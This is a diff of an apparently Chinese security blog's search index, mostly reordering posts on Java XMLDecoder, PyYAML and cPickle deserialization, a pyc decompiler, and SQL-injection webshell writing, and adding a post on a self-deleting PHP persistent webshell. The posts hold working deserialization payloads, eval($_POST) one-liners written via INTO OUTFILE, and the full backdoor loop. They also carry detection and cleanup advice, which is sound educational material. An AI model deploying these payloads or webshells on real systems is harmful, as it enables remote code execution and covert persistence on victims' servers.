那么可以去分析一下，到底哪个类才是真正的漏洞类。测试一下，可以看出DocumentHandler类才是XMLDecoder反序列化漏洞的根源类： 检测方法全局搜索XMLDecoder关键字，排查是否调用readObject()函数且参数是否可控。 防御方法若可以尽量不使用XMLDecoder反序列化XML内容；若使用则尽量确保参数不可由外界输入，尽量以白名单的方式限定XML文档名且结合严格的过滤机制。]]></content>
+      <categories>
+        <category>Java</category>
+      </categories>
+      <tags>
+        <tag>Web安全</tag>
+        <tag>Java</tag>
       </tags>
   </entry>
   <entry>
@@ -849,14 +861,14 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[Python PyYAML反序列化漏洞]]></title>
-    <url>%2F2019%2F01%2F01%2FPyYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%2F</url>
-    <content type="text"><![CDATA[基本概念（引用百度）YAML是“YAML不是一种标记语言”的外语缩写；但为了强调这种语言以数据做为中心，而不是以置标语言为重点，而用返璞词重新命名。它是一种直观的能够被电脑识别的数据序列化格式，是一个可读性高并且容易被人类阅读，容易和脚本语言交互，用来表达资料序列的编程语言。 PyYAML是Python中YAML语言的编辑器和解释器。 安装：pip install PyYAML 两个函数： yaml.dump()：将一个Python对象序列化生成为yaml文档。 yaml.load()：将一个yaml文档反序列化为一个Python对象。 简单的用例： 可以看到，User对象经过yaml序列化之后内容为一行字符串，简单解释一下：“!!pythonobject”为yaml标签，yaml.load()会识别该标签并调用相应的方法执行反序列化操作；冒号后面的“__main__”为py文件名，这里为本文件的意思；“User”为序列化的对象类型，后面紧跟的大括号即为该对象的属性及其属性值。 更详细的说明可参考官方文档。 Demo这里编写简单的Demo，一个py文件用于将恶意类序列化为字符串保存到yaml文件中，另一个py文件用于反序列化yaml文件内容为恶意类对象从而达到利用反序列化漏洞的目的。 yaml_test.py先创建一个poc对象再调用yaml.dump()将其序列化为一个字符串，其中第10行代码为将默认的“__main__”替换为该文件名“yaml_test”，目的是为了后面yaml.load()反序列化该字符串的时候会根据yaml文件中的指引去读取yaml_ test.py中的poc这个类，否则无法正确执行： yaml_test2.py直接yaml.load()读取目标yaml文件，由!!python/object标签解析其中的名为yaml_test的module中的poc类，最后执行了该类对象的__init__()方法从而执行了命令： 漏洞根源分析到$PYTHON_HOME/lib/site-packages/yaml/constructor.py中查看3个特殊Python标签的源码。 !!python/object标签： !!python/object/new标签： !!python/object/apply标签： 可以看到，!!python/object/new标签的代码实现其实就是!!python/object/apply标签的代码实现，只是最后newobj参数值不同而已。这3个Python标签中都是调用了make_python_instance()函数，查看该函数： 可以看到，在该函数是会根据参数来动态创建新的Python类对象或通过引用module的类创建对象，从而可以执行任意命令。 通用payload只要存在yaml.load()且参数可控，则可以利用yaml反序列化漏洞，payload列举如下，当然不止如下： 附上测试代码： 1234567891011import yamlpayload = '!!python/object/apply:subprocess.check_output [[calc.exe]]'#payload = '!!python/object/apply:subprocess.check_output ["calc.exe"]'#payload = '!!python/object/apply:subprocess.check_output [["calc.exe"]]'#payload = '!!python/object/apply:os.system ["calc.exe"]'#payload = '!!python/object/new:subprocess.check_output [["calc.exe"]]'#payload = '!!python/object/new:os.system ["calc.exe"]'yaml.load(payload) 一个疑问点？为什么“!!python/object”标签不好使，明明Demo用的是这个标签，但通用payload中无法执行该payload？看了一些网上的文章也没有分析原因，其实查看官方文档就知道怎么回事了： 可以看到，!!python/object标签的使用格式和另外两个根本就是两码事，其接收参数是使用大括号{}而非中括号[]，且并没有对参数args进行接收。也就是说，!!python/object标签只针对于对象类进行使用。 检测方法全局搜索Python代码中是否包含“import yaml”，若包含则进一步排查是否调用yaml.load()且参数是可控的。 防御方法使用安全函数yaml.safe_load()替代yaml.load()即可。]]></content>
+    <title><![CDATA[Python安全小工具之反编译pyc文件]]></title>
+    <url>%2F2019%2F01%2F01%2FPython%E5%AE%89%E5%85%A8%E5%B0%8F%E5%B7%A5%E5%85%B7%E4%B9%8B%E5%8F%8D%E7%BC%96%E8%AF%91pyc%E6%96%87%E4%BB%B6%2F</url>
+    <content type="text"><![CDATA[有时需要查看某个Python Web目录内Python源码，但dump下来只有pyc文件而没有py文件，这时需要我们反编译pyc文件为py文件。为了方便就写个脚本遍历目录内的pyc文件并进行反编译。 1234567891011121314151617181920212223242526272829303132#coding=utf-8import osimport sysimport uncompyle6def Decompile(path): if os.path.exists(path): for parent,dirs,files in os.walk(path): for file in files: file_name,ext = os.path.splitext(file) if ext == ".pyc": file_path = os.path.join(parent,file) print "[*]Decompiling:", file_path cmd = "uncompyle6 " + file_path + " &gt; " + parent + "\\" + file_name + ".py" try: os.system(cmd) print "[+]Decompile successful.\n" except Exception as e: print e print "[*]Finished." else: print "[-]Wrong Directory Path."def main(): if len(sys.argv) != 2: print "[*]Usage: python decompile.py [Directory Path]" else: path = sys.argv[1] Decompile(path)if __name__ == "__main__": main() 运行效果：]]></content>
       <categories>
         <category>Python</category>
       </categories>
       <tags>
-        <tag>Web安全</tag>
+        <tag>安全开发</tag>
         <tag>Python</tag>
       </tags>
   </entry>
@@ -872,18 +884,6 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[SQL注入写WebShell方式小结]]></title>
-    <url>%2F2019%2F01%2F01%2FSQL%E6%B3%A8%E5%85%A5%E5%86%99WebShell%E6%96%B9%E5%BC%8F%E5%B0%8F%E7%BB%93%2F</url>
-    <content type="text"><![CDATA[这里小结一下通过SQL注入写入WebShell的方法。 通过SQL注入select into outfile实现，如： 1’ union select 1,’\&lt;?php eval($_POST[a]);?&gt;’ INTO OUTFILE ‘/var/www/tmp/nb.php’# 前提都是需要对目标目录具有写权限。 –os-cmd=”net user”交互式命令执行，注意在使用交互式方式时需要知道网站的绝对路径，执行成功之后在绝对路径下创建文件返回结果，然后再自动删除。 ##–os-shell写webshell，会生成两个文件，tmpbshrd.php和tmpucnll.php，分别为命令执行和文件上传webshell。注意:关闭sqlmap文件就会被删除。 ##本地写入webshell先在sqlmap的目录创建mst目录，然后在该目录中创建mst.txt，内容为一句话木马，之后需要两个参数即本地文件地址和目标文件地址，–file-write “./mst/mst.txt” –file-dest “网站的绝对路径/1.php”。 注意需要最高权限。 MySQL写木马，通常可以通过phpmyadmin来实现。 前提条件：有读写的权限，有CREATE、INSERT、SELECT的权限。 1、创建一个表 CREATE TABLE a (cmd text NOT NULL); 2、插入数据 INSERT INTO a (cmd) VALUES(‘\&lt;?php eval($_POST[‘password’]);?&gt;’); 3、导出一句话 SELECT cmd from a into outfile ‘/var/www/tmp/webshell.php’; 4、删除表 Drop TABLE IF EXISTS a;]]></content>
-      <categories>
-        <category>Web安全基础</category>
-      </categories>
-      <tags>
-        <tag>Web安全</tag>
-        <tag>SQLI</tag>
-      </tags>
-  </entry>
-  <entry>
     <title><![CDATA[HITB Binary 100 writeup]]></title>
     <url>%2F2019%2F01%2F01%2FHITB_Binary_100_writeup%2F</url>
     <content type="text"><![CDATA[HITB Binary 100是之前的HITB CTF的一道简单的逆向题，这里简单做一遍。 下载hitb-bin100.elf 将elf文件先跑一下，发现像歌词播放一样、每个一秒钟左右输出一句话，歌词好像没啥用，而且运行很久也还没停下来： 根据字符串检索法，扔到IDA的String窗口查看是否存在关键字符串，可以看到有“FLAG”相关的字符串： 点击进去查看，发现这段代码是在main()函数中的： 接着查看一下该二进制文件的函数等信息： 在Function Window也可以看到，除了调用一些标准库的函数，整个程序几乎都编译到了main函数中： 查看main函数的汇编代码，可以看到有两个地址值得研究，即4007e8和400803，因为其中都是会调用printf函数输出内容： 直接在GDB上运行并jump到相应的地址查看： 可以看到，KEY是正常的输出出来了，但是FLAG输出的是一堆乱码，然后就出现“stack smashing detected”的错误而终止运行了。跳过去直接输出Flag是不可能的了。 F5看一下伪代码吧，看到在输出flag前一段主要的代码： 分析可知，v20变量存放的是该循环执行的次数、无法改变；v21变量调用time函数生成一个时间戳，用于后续与v6变量的相减形成随机种子值；v11变量用于内循环执行的次数，从0-36；v6变量同样调用time函数生成一个时间戳，与v21变量不同在于每次内循环结束后重新生成时间戳时都会先sleep 1s后再生成；在内循环的最后是一个sleep()函数，调用来休眠1s；其余的代码都是用于生成输出的字符串。 这里如果想直接nop掉sleep()函数是行不通的，因为整段代码的执行依赖于该sleep()函数，v6与v21的差值在每次内循环结束的时候都会通过sleep()函数实现增一，如果不这样正常处理，将得不到正常的flag。 换个思路，这里关键的两个函数是sleep()和time()，我们可以重新定义该两个函数，通过LD_PRELOAD预先加载这两个函数而不是调用系统自己的从而实现欺骗程序该代码确实是睡眠了1s了，也就是说，自定义的sleep()函数直接对时间变量t自增1而不是真的等待了一秒才运行结束，从而可以将程序的休眠时间去掉： gcc编译为so文件（-fpic参数指定为位置无关、即使用相对地址，-shared参数指定为共享库），再通过LD_PRELOAD在该elf程序运行前优先加载生成的动态链接库time.so并管道输出到一个文件中查看，可以看到输出了flag：]]></content>
@@ -895,6 +895,18 @@
       </tags>
   </entry>
   <entry>
+    <title><![CDATA[SQL注入写WebShell方式小结]]></title>
+    <url>%2F2019%2F01%2F01%2FSQL%E6%B3%A8%E5%85%A5%E5%86%99WebShell%E6%96%B9%E5%BC%8F%E5%B0%8F%E7%BB%93%2F</url>
+    <content type="text"><![CDATA[这里小结一下通过SQL注入写入WebShell的方法。 通过SQL注入select into outfile实现，如： 1’ union select 1,’\&lt;?php eval($_POST[a]);?&gt;’ INTO OUTFILE ‘/var/www/tmp/nb.php’# 前提都是需要对目标目录具有写权限。 –os-cmd=”net user”交互式命令执行，注意在使用交互式方式时需要知道网站的绝对路径，执行成功之后在绝对路径下创建文件返回结果，然后再自动删除。 ##–os-shell写webshell，会生成两个文件，tmpbshrd.php和tmpucnll.php，分别为命令执行和文件上传webshell。注意:关闭sqlmap文件就会被删除。 ##本地写入webshell先在sqlmap的目录创建mst目录，然后在该目录中创建mst.txt，内容为一句话木马，之后需要两个参数即本地文件地址和目标文件地址，–file-write “./mst/mst.txt” –file-dest “网站的绝对路径/1.php”。 注意需要最高权限。 MySQL写木马，通常可以通过phpmyadmin来实现。 前提条件：有读写的权限，有CREATE、INSERT、SELECT的权限。 1、创建一个表 CREATE TABLE a (cmd text NOT NULL); 2、插入数据 INSERT INTO a (cmd) VALUES(‘\&lt;?php eval($_POST[‘password’]);?&gt;’); 3、导出一句话 SELECT cmd from a into outfile ‘/var/www/tmp/webshell.php’; 4、删除表 Drop TABLE IF EXISTS a;]]></content>
+      <categories>
+        <category>Web安全基础</category>
+      </categories>
+      <tags>
+        <tag>Web安全</tag>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[Python cPickle反序列化漏洞]]></title>
     <url>%2F2019%2F01%2F01%2FcPickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%2F</url>
     <content type="text"><![CDATA[基本概念Python中有个库可以实现序列化和反序列化操作，名为pickle或cPickle，作用和PHP的serialize与unserialize一样，两者只是实现的语言不同，一个是纯Python实现、另一个是C实现，函数调用基本相同，但cPickle库的性能更好，因此这里选用cPickle库作为示例。 cPickle可以对任意一种类型的Python对象进行序列化操作。下面是主要的四个函数： cPickle.dump()：将Python对象序列化保存到本地的文件中。 cPickle.load()：载入本地文件，将文件内容反序列化为Python对象。 cPickle.dumps()：将Python对象序列化为字符串。 cPickle.loads()：将字符串反序列化为Python对象。 简单示例： 先创建Person类对象并初始化，然后将其序列化并输出，可以看到是C解释过的内容： 为了方便，直接在该代码下面添加反序列化操作： Demo还是用上面的示例，添加一个__reduce__()魔术方法： 漏洞根源分析漏洞产生的原因在于其可以将自定义的类进行序列化和反序列化。反序列化后产生的对象会在结束时触发__reduce__()函数从而触发恶意代码。 简单说明一下__reduce__()函数：将一个数据集合（链表，元组等）中的所有数据进行下列操作：用传给 reduce 中的函数 function（有两个参数）先对集合中的第 1、2 个元素进行操作，得到的结果再与第三个数据用 function 函数运算，最后得到一个结果。 由于cPickle是C写的代码且pickle与其实现原理一致，所以到$PYTHON_HOME/Lib/pickle.py中查看reduce加载的源码： 通过调试可以发现，第1136行将当前栈内容赋值给stack变量，当前栈内容包含我们输入的恶意的os.system(“calc.txt”)内容，接着出栈赋值给args变量；通常函数返回地址都保存在当前EBP寄存器所指的上方，因此通过stack[-1]可以获取返回函数地址并赋值给func变量；最后调用func(*args)传入特定参数执行函数，从而完成对象的调用解析而执行任意命令。 通用payload因为反序列化之后用到的库需要在反序列化的文件中存在，所以这里简单分为未导入和导入目标模块即这里为os模块的情况，当然除此之外还有其他一些系统执行库、其他的姿势等等，可自行补充，后面有空再补上吧： 这里贴上测试代码： 12345678910111213141516171819202122232425#coding=utf-8import cPickleclass Person(object): def __init__(self,username,password): self.username = username self.password = password def __reduce__(self): # 未导入os模块，通用 return (__import__('os').system, ('calc.exe',)) # return eval,("__import__('os').system('calc.exe')",) # return map, (__import__('os').system, ('calc.exe',)) # return map, (__import__('os').system, ['calc.exe']) # 导入os模块 # return (os.system, ('calc.exe',)) # return eval, ("os.system('calc.exe')",) # return map, (os.system, ('calc.exe',)) # return map, (os.system, ['calc.exe'])admin = Person('admin','123456')result = cPickle.dumps(admin)user = cPickle.loads(result) 检测方法全局搜索Python代码中是否含有关键字类似“import cPickle”或“import pickle”等，若存在则进一步确认是否调用cPickle.loads()或pickle.loads()且反序列化的参数可控。 防御方法1、用更高级的接口__getnewargs()、__getstate__()、__setstate__()等代替__reduce__()魔术方法； 2、进行反序列化操作之前，进行严格的过滤，若采用的是pickle库可采用装饰器实现。]]></content>
@@ -902,8 +914,8 @@
         <category>Python</category>
       </categories>
       <tags>
-        <tag>Web安全</tag>
         <tag>Python</tag>
+        <tag>Web安全</tag>
       </tags>
   </entry>
   <entry>
@@ -919,15 +931,16 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[Python安全小工具之反编译pyc文件]]></title>
-    <url>%2F2019%2F01%2F01%2FPython%E5%AE%89%E5%85%A8%E5%B0%8F%E5%B7%A5%E5%85%B7%E4%B9%8B%E5%8F%8D%E7%BC%96%E8%AF%91pyc%E6%96%87%E4%BB%B6%2F</url>
-    <content type="text"><![CDATA[有时需要查看某个Python Web目录内Python源码，但dump下来只有pyc文件而没有py文件，这时需要我们反编译pyc文件为py文件。为了方便就写个脚本遍历目录内的pyc文件并进行反编译。 1234567891011121314151617181920212223242526272829303132#coding=utf-8import osimport sysimport uncompyle6def Decompile(path): if os.path.exists(path): for parent,dirs,files in os.walk(path): for file in files: file_name,ext = os.path.splitext(file) if ext == ".pyc": file_path = os.path.join(parent,file) print "[*]Decompiling:", file_path cmd = "uncompyle6 " + file_path + " &gt; " + parent + "\\" + file_name + ".py" try: os.system(cmd) print "[+]Decompile successful.\n" except Exception as e: print e print "[*]Finished." else: print "[-]Wrong Directory Path."def main(): if len(sys.argv) != 2: print "[*]Usage: python decompile.py [Directory Path]" else: path = sys.argv[1] Decompile(path)if __name__ == "__main__": main() 运行效果：]]></content>
+    <title><![CDATA[PHP内存型木马]]></title>
+    <url>%2F2019%2F01%2F01%2FPHP%E5%86%85%E5%AD%98%E5%9E%8B%E6%9C%A8%E9%A9%AC%2F</url>
+    <content type="text"><![CDATA[基本概念PHP内存性木马即PHP不死马，一般会删除自身以进程的形式循环创建隐蔽的后门。 通常在AWD Web题中用得较多。 Demo及原理nodie.php 123456789101112&lt;?php ignore_user_abort(true); set_time_limit(0); unlink(__FILE__); $file = '/var/www/dvwa/.ski12.php'; $code = '&lt;?php if(md5($_POST["pass"])=="cdd7b7420654eb16c1e1b748d5b7c5b8")&#123;@system($_POST[a]);&#125;?&gt;'; while (1) &#123; file_put_contents($file, $code); system('touch -m -d "2018-12-01 09:10:12" .ski12.php'); usleep(5000); &#125;?&gt; 简单分析： ignore_user_abort()函数设置与客户机断开是否会终止脚本的执行。这里设置为true则忽略与用户的断开，即使与客户机断开脚本仍会执行。 set_time_limit()函数设置脚本最大执行时间。这里设置为0，即没有时间方面的限制。 unlink(__FILE__)删除文件本身，以起到隐蔽自身的作用。 while循环内每隔usleep(5000)即写新的后门文件，中间system()执行的命令用于修改文件的创建或修改时间，可以绕过“find –name \’*.php\’ –mmin -10”命令检测最近10分钟修改或新创建的PHP文件，但不一定有用，可选。 至于最后生成的隐蔽后门在需要校验一个POST参数的MD5值，原因在于防止其他人可以进行利用。 这里以DVWA为示例： 先找到上传点上传nodie.php： 访问文件所在路径让其执行，等待一会发现404，该文件不存在： 一般而言分两种情况，一种是乐观的、即文件执行成功且删除了自身、生成了隐蔽的后门；另一种是被干掉了。直接访问我们设置生成的隐蔽后门的路径检测一下是否真的生成了后门文件： 虽然没有返回，但确实存在该文件，接着直接利用即可： 以运维的视角尝试删除文件，发现删不掉： 查杀方法1、如果允许，重启服务是万能的； 2、其次，最好的解决方案是kill掉www-data用户的所有子进程： ps aux | grep www-data | awk ‘{print $2}’ | xargs kill -9 3、创建一个和不死马生成的马一样名字的目录； 4、编写一个使用ignore_user_abort(true)函数的脚本，一直竞争写入删除不死马文件，其中usleep()的时间必须要小于不死马的usleep()时间才会有效果。简单示例： 12345678&lt;?phpwhile (1) &#123; $pid = 不死马的进程PID; @unlink(".ski12.php"); exec("kill -9 $pid"); usleep(1000);&#125;?&gt;]]></content>
       <categories>
-        <category>Python</category>
+        <category>PHP</category>
       </categories>
       <tags>
-        <tag>安全开发</tag>
-        <tag>Python</tag>
+        <tag>AWD</tag>
+        <tag>Web安全</tag>
+        <tag>PHP</tag>
       </tags>
   </entry>
 </search>
